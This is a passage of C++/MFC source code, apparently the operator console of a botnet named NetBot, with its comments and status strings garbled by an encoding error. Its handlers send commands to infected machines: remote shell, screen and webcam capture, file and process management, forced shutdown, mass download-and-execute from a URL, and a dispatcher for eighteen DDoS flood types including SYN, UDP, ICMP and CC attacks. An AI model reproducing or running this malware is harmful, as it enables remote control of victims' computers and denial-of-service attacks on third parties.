		m_CurrSock = INVALID_SOCKET;
		m_CurrIndex = -1;
	}

	*pResult = 0;
}

//�һ��б����ʾ�˵�
void CNetBotDlg::OnRclickListOnline(NMHDR* pNMHDR, LRESULT* pResult)
{
	POSITION pos = m_OnLineList.GetFirstSelectedItemPosition();
	int iCurrSel = m_OnLineList.GetNextSelectedItem(pos);
	if (iCurrSel >= 0)
	{
		m_CurrSock = m_OnLineList.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;

		//��ʾ�Ҽ��˵�
		CMenu OnLineMenu, *pSubMenu;
		OnLineMenu.LoadMenu(IDR_MENU_ONLINE);
		pSubMenu = OnLineMenu.GetSubMenu(0);
		CPoint oPoint;
		GetCursorPos(&oPoint);
		pSubMenu->TrackPopupMenu(TPM_LEFTALIGN, oPoint.x, oPoint.y, this);
	}
	*pResult = 0;
}

//�Ҽ��˵�
void CNetBotDlg::OnOnlineFilemanage()
{
	if (m_CurrSock != INVALID_SOCKET)
	{
		//���Ϳ����ļ���������
		MsgHead msgHead;
		msgHead.dwCmd = CMD_FILEMANAGE;
		msgHead.dwSize = 0;

		if (SendMsg(m_CurrSock, NULL, &msgHead))
		{
			//���ͳɹ��������Ϣ
			StatusTextOut(0, "�ɹ����� [�ļ�����] ����");
		}
		else
		{
			//����ʧ�ܣ��ر�socket
			shutdown(m_CurrSock, 0x02);
			closesocket(m_CurrSock);
		}
	}
	else
		StatusTextOut(0, "��ѡ���������");
}

void CNetBotDlg::OnOnlineScreen()
{
	if (m_CurrSock != INVALID_SOCKET)
	{
		//���Ϳ�����Ļ����
		MsgHead msgHead;
		msgHead.dwCmd = CMD_SCREENSTART;
		msgHead.dwSize = 0;
		msgHead.dwExtend1 = m_CurrSock;

		if (SendMsg(m_CurrSock, NULL, &msgHead))
		{
			//���ͳɹ��������Ϣ
			StatusTextOut(0, "�ɹ����� [��Ļ���] ����");
		}
		else
		{
			//����ʧ�ܣ��ر�socket
			shutdown(m_CurrSock, 0x02);
			closesocket(m_CurrSock);
		}
	}
	else
		StatusTextOut(0, "��ѡ���������");
}

void CNetBotDlg::OnOnlineProcess()
{
	if (m_CurrSock != INVALID_SOCKET)
	{
		//���Ϳ������̹�������
		MsgHead msgHead;
		msgHead.dwCmd = CMD_PROCESSSTART;
		msgHead.dwSize = 0;

		if (SendMsg(m_CurrSock, NULL, &msgHead))
		{
			//���ͳɹ��������Ϣ
			StatusTextOut(0, "�ɹ����� [���̲�ѯ] ����");
		}
		else
		{
			//����ʧ�ܣ��ر�socket
			shutdown(m_CurrSock, 0x02);
			closesocket(m_CurrSock);
		}
	}
	else
		StatusTextOut(0, "��ѡ���������");
}

void CNetBotDlg::OnOnlineShell()
{
	if (m_CurrSock != INVALID_SOCKET)
	{
		//���Ϳ���Զ��shell����
		MsgHead msgHead;
		msgHead.dwCmd = CMD_SHELLSTART;
		msgHead.dwSize = 0;

		if (SendMsg(m_CurrSock, NULL, &msgHead))
		{
			//���ͳɹ��������Ϣ
			StatusTextOut(0, "�ɹ����� [Զ��Shell] ����");
		}
		else
		{
			//����ʧ�ܣ��ر�socket
			shutdown(m_CurrSock, 0x02);
			closesocket(m_CurrSock);
		}
	}
	else
		StatusTextOut(0, "��ѡ���������");
}

void CNetBotDlg::OnOnlineVideo()
{
	if (m_CurrSock != INVALID_SOCKET)
	{
		//������Ƶ��׽����
		MsgHead msgHead;
		msgHead.dwCmd = CMD_VIDEOSTART;
		msgHead.dwSize = 0;

		if (SendMsg(m_CurrSock, NULL, &msgHead))
		{
			//���ͳɹ��������Ϣ
			StatusTextOut(0, "�ɹ����� [��Ƶ��׽] ����");
		}
		else
		{
			//����ʧ�ܣ��ر�socket
			shutdown(m_CurrSock, 0x02);
			closesocket(m_CurrSock);
		}
	}
	else
		StatusTextOut(0, "��ѡ���������");
}

void CNetBotDlg::OnOnlinePoweroff()
{
	if (m_CurrSock != INVALID_SOCKET)
	{
		//����[�ػ�]����
		MsgHead msgHead;
		msgHead.dwCmd = CMD_POWEROFF;
		msgHead.dwSize = 0;

		if (SendMsg(m_CurrSock, NULL, &msgHead))
		{
			//���ͳɹ��������Ϣ
			StatusTextOut(0, "�ɹ����� [Զ�̹ػ�] ����");
		}
		else
		{
			//����ʧ�ܣ��ر�socket
			shutdown(m_CurrSock, 0x02);
			closesocket(m_CurrSock);
		}
	}
}

void CNetBotDlg::OnOnlineReboot()
{
	if (m_CurrSock != INVALID_SOCKET)
	{
		//����[����]����
		MsgHead msgHead;
		msgHead.dwCmd = CMD_REBOOT;
		msgHead.dwSize = 0;

		if (SendMsg(m_CurrSock, NULL, &msgHead))
		{
			//���ͳɹ��������Ϣ
			StatusTextOut(0, "�ɹ����� [Զ������] ����");
		}
		else
		{
			//����ʧ�ܣ��ر�socket
			shutdown(m_CurrSock, 0x02);
			closesocket(m_CurrSock);
		}
	}
}

void CNetBotDlg::OnOnlineLogoff()
{
	// TODO: Add your command handler code here
	if (m_CurrSock != INVALID_SOCKET)
	{
		//����[ע��]����
		MsgHead msgHead;
		msgHead.dwCmd = CMD_LOGOFF;
		msgHead.dwSize = 0;

		if (SendMsg(m_CurrSock, NULL, &msgHead))
		{
			//���ͳɹ��������Ϣ
			StatusTextOut(0, "�ɹ����� [Զ��ע��] ����");
		}
		else
		{
			//����ʧ�ܣ��ر�socket
			shutdown(m_CurrSock, 0x02);
			closesocket(m_CurrSock);
		}
	}
}

void CNetBotDlg::OnOnlineUninstall()
{
	if (m_CurrSock != INVALID_SOCKET)
	{
		//����[ж��]����
		MsgHead msgHead;
		msgHead.dwCmd = CMD_UNINSTALL;
		msgHead.dwSize = 0;

		if (SendMsg(m_CurrSock, NULL, &msgHead))
		{
			//���ͳɹ��������Ϣ
			StatusTextOut(0, "�ɹ����� [Զ��ж��] ����");
		}
		else
		{
			//����ʧ�ܣ��ر�socket
			shutdown(m_CurrSock, 0x02);
			closesocket(m_CurrSock);
		}
	}
}

void CNetBotDlg::OnOnlineRestart()
{
	if (m_CurrSock != INVALID_SOCKET)
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_RESTART;
		msgHead.dwSize = 0;

		if (SendMsg(m_CurrSock, NULL, &msgHead))
		{
			StatusTextOut(0, "�ɹ����� [���¼���] ����");
		}
		else
		{
			shutdown(m_CurrSock, 0x02);
			closesocket(m_CurrSock);
		}
	}
}

void CNetBotDlg::OnBtnMulpoweroff()
{
	MsgHead msgHead;
	msgHead.dwCmd = CMD_POWEROFF;
	msgHead.dwSize = 0;

	CAutoLock Lock(cOnlineLock);

	int AllNum = m_OnLineList.GetItemCount();
	int iSendNum = 0;
	DWORD socket;
	for (int i = 0; i < AllNum; i++)
	{
		if (m_OnLineList.GetCheck(i))
		{
			socket = m_OnLineList.GetItemData(i);

			if (SendMsg(socket, NULL, &msgHead))
			{
				iSendNum++;
			}
			else
			{
				shutdown(socket, 0x02);
				closesocket(socket);
			}
		}
	}

	StatusTextOut(0, "�ɹ�����%d��[Զ�̹ػ�]����", iSendNum);
}

void CNetBotDlg::OnBtnMulreboot()
{
	MsgHead msgHead;
	msgHead.dwCmd = CMD_REBOOT;
	msgHead.dwSize = 0;

	CAutoLock Lock(cOnlineLock);

	int AllNum = m_OnLineList.GetItemCount();
	int iSendNum = 0;
	DWORD socket;
	for (int i = 0; i < AllNum; i++)
	{
		if (m_OnLineList.GetCheck(i))
		{
			socket = m_OnLineList.GetItemData(i);

			if (SendMsg(socket, NULL, &msgHead))
			{
				iSendNum++;
			}
			else
			{
				shutdown(socket, 0x02);
				closesocket(socket);
			}
		}
	}

	StatusTextOut(0, "�ɹ�����%d��[Զ������]����", iSendNum);
}

void CNetBotDlg::OnBtnMulexec()
{
	UpdateData();

	MsgHead msgHead;
	char chBuffer[256];

	msgHead.dwCmd = CMD_DOWNEXEC;
	msgHead.dwSize = m_ExecUrl.GetLength();
	strcpy(chBuffer, m_ExecUrl);

	CAutoLock Lock(cOnlineLock);

	int AllNum = m_OnLineList.GetItemCount();
	int iSendNum = 0;
	DWORD socket;
	for (int i = 0; i < AllNum; i++)
	{
		if (m_OnLineList.GetCheck(i))
		{
			socket = m_OnLineList.GetItemData(i);

			if (SendMsg(socket, chBuffer, &msgHead))
			{
				iSendNum++;
			}
			else
			{
				shutdown(socket, 0x02);
				closesocket(socket);
			}
		}
	}

	StatusTextOut(0, "�ɹ�����%d��[��������]����", iSendNum);
}

void CNetBotDlg::OnBtnMulopen()
{
	UpdateData();

	MsgHead msgHead;
	char chBuffer[256];

	msgHead.dwCmd = CMD_OPENURL;
	msgHead.dwSize = m_OpenUrl.GetLength();
	strcpy(chBuffer, m_OpenUrl);

	CAutoLock Lock(cOnlineLock);

	int AllNum = m_OnLineList.GetItemCount();
	int iSendNum = 0;
	DWORD socket;
	for (int i = 0; i < AllNum; i++)
	{
		if (m_OnLineList.GetCheck(i))
		{
			socket = m_OnLineList.GetItemData(i);

			if (SendMsg(socket, chBuffer, &msgHead))
			{
				iSendNum++;
			}
			else
			{
				shutdown(socket, 0x02);
				closesocket(socket);
			}
		}
	}

	StatusTextOut(0, "�ɹ�����%d��[����ҳ]����", iSendNum);
}

int CNetBotDlg::AttackTask(int task, CString ip, int port, int type, int thread, int num, BOOL bAutoAttack)
{
	DdosAttack m_Attack;
	memset(&m_Attack, 0, sizeof(DdosAttack));
	strcpy(m_Attack.szTarget, ip);
	m_Attack.iPort = port;
	m_Attack.iThread = thread;

	MsgHead msgHead;
	msgHead.dwSize = sizeof(DdosAttack);
	switch (type)
	{
	case 1:
		msgHead.dwCmd = CMD_DDOSSYNFLOOD;
		break;
	case 2:
		msgHead.dwCmd = CMD_DDOSICMPFLOOD;
		break;
	case 3:
		msgHead.dwCmd = CMD_DDOSUDPFLOOD;
		break;
	case 4:
		msgHead.dwCmd = CMD_DDOSUDPSMALL;
		break;
	case 5:
		msgHead.dwCmd = CMD_DDOSTCPFLOOD;
		break;
	case 6:
		msgHead.dwCmd = CMD_DDOSTCPMULT;
		break;
	case 7:
		msgHead.dwCmd = CMD_DDOSNOCACHE;
		break;
	case 8:
		msgHead.dwCmd = CMD_DDOSCCATTACK;
		break;
	case 9:
		msgHead.dwCmd = CMD_DDOSGETNULL;
		break;
	case 10:
		msgHead.dwCmd = CMD_DDOSCHUANQI;
		break;
	case 11:
		msgHead.dwCmd = CMD_DDOSNETGATE;
		break;
	case 12:
		msgHead.dwCmd = CMD_DDOSSMART;
		break;
	case 13:
		msgHead.dwCmd = CMD_DDOSSYNUDP;
		break;
	case 14:
		msgHead.dwCmd = CMD_DDOSTCMPTCP;
		break;
	case 15:
		msgHead.dwCmd = CMD_DDOSUDPTCP;
		break;
	case 16:
		msgHead.dwCmd = CMD_DDOSFINWAIT1;
		break;
	case 17:
		msgHead.dwCmd = CMD_DDOSFINWAIT2;
		break;
	case 18:
		msgHead.dwCmd = CMD_DDOSESTABLISH;
		break;
	default:
		msgHead.dwCmd = CMD_DDOSUDPSMALL;
		break;
	}

	if (task == 0)
	{
		if (bAutoAttack)
		{
			m_AutoAttack.bAutoAttack = TRUE;
			m_AutoAttack.dwAttackType = msgHead.dwCmd;
			strcpy(m_AutoAttack.szAttackIP, m_Attack.szTarget);
			m_AutoAttack.iAttackPort = m_Attack.iPort;
			m_AutoAttack.iAttackThread = m_Attack.iThread;
		}
		else
		{
			m_AutoAttack.bAutoAttack = FALSE;
		}
	}

	CString strTask;
	strTask.Format("����%d", task);

	CAutoLock Lock(cOnlineLock);

	int AllNum = m_OnLineList.GetItemCount();
	int iSendNum = 0;

	for (int i = 0; i < AllNum; i++)
	{
		DWORD socket;
		CString status;

		status = m_OnLineList.GetItemText(i, 6);

		if (status == "����")
		{
			//�������ѡ������������Ϊһ���ϴ������
			if (num < 0 || num == 100000)
			{
				num = 100000;
				//��鿴�Ƿ�ѡ�У�δѡ�е�����
				if (!m_OnLineList.GetCheck(i))
					continue;
			}
			if (iSendNum < num)
			{
				socket = m_OnLineList.GetItemData(i);

				if (SendMsg(socket, (char*)&m_Attack, &msgHead))
				{
					m_OnLineList.SetItemText(i, 6, strTask);
					iSendNum++;
				}
				else//����ʧ�ܣ��ر�socket
				{
					shutdown(socket, 0x02);
					closesocket(socket);
				}
			}
			else
			{//��������
				break;
			}
		}
	}

	return iSendNum;
}

int CNetBotDlg::AttackSpiderCC(int task, CString ip, int port, int thread, int num, int iBegin, int iEnd)
{
	DdosAttack m_Attack;
	memset(&m_Attack, 0, sizeof(DdosAttack));
	strcpy(m_Attack.szTarget, ip);
	m_Attack.iPort = port;
	m_Attack.iThread = thread;
	m_Attack.iExtend1 = iBegin;
	m_Attack.iExtend2 = iEnd;

	MsgHead msgHead;
	msgHead.dwCmd = CMD_DDOSSPIDERCC;
	msgHead.dwSize = sizeof(DdosAttack);

	CString strTask; strTask.Format("����%d", task);//Spider CC Attack

	CAutoLock Lock(cOnlineLock);

	int AllNum = m_OnLineList.GetItemCount();
	int iSendNum = 0;

	for (int i = 0; i < AllNum; i++)
	{
		DWORD socket;
		CString status;

		status = m_OnLineList.GetItemText(i, 6);

		if (status == "����")
		{
			//�������ѡ������������Ϊһ���ϴ������
			if (num < 0 || num == 100000)
			{
				num = 100000;
				//��鿴�Ƿ�ѡ�У�δѡ�е�����
				if (!m_OnLineList.GetCheck(i))
					continue;
			}
			if (iSendNum < num)
			{
				socket = m_OnLineList.GetItemData(i);

				if (SendMsg(socket, (char*)&m_Attack, &msgHead))
				{
					m_OnLineList.SetItemText(i, 6, strTask);
					iSendNum++;
				}
				else//����ʧ�ܣ��ر�socket
				{
					shutdown(socket, 0x02);
					closesocket(socket);
				}
			}
			else
			{//��������
				break;
			}
		}
	}

	return iSendNum;
}

int CNetBotDlg::AttackStop(int task)
{
	MsgHead msgHead;
	msgHead.dwCmd = CMD_DDOSSTOP;
	msgHead.dwSize = 0;

	if (task == 0)
	{
		m_AutoAttack.bAutoAttack = FALSE;
	}

	CString strTask;
	strTask.Format("����%d", task);

	CAutoLock Lock(cOnlineLock);
	int AllNum = m_OnLineList.GetItemCount();
	int iSendNum = 0;

	for (int i = 0; i < AllNum; i++)
	{
		DWORD socket;
		CString status;

		status = m_OnLineList.GetItemText(i, 6);
		if (status == strTask)
		{
			socket = m_OnLineList.GetItemData(i);

			if (SendMsg(socket, NULL, &msgHead))
			{
				m_OnLineList.SetItemText(i, 6, "����");
				iSendNum++;
			}
			else//����ʧ�ܣ��ر�socket
			{
				shutdown(socket, 0x02);
				closesocket(socket);
			}
		}
	}

	return iSendNum;
}
